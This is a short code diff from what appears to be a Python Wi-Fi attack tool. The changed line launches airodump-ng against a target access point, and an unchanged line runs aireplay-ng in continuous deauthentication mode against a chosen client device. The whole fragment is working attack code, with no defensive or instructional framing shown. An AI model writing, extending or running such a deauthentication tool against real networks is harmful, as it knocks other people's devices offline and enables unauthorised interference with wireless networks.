@@ -57,7 +57,7 @@ def main():
         #print("Initializing...\n")
         print("Targeting "+ target + " at address " + table[target])
         print("Press ctlr+c to quit. ")
-        os.system(arg1)
+        os.system("xterm -e timeout 5 airodump-ng -d " + BSSID + " -c 11 wlan0mon")
         time.sleep(1)
         os.system("xterm -e aireplay-ng -0 0 -a " + BSSID + " -c " + table[target] + " -x 15 wlan0mon")
     else:
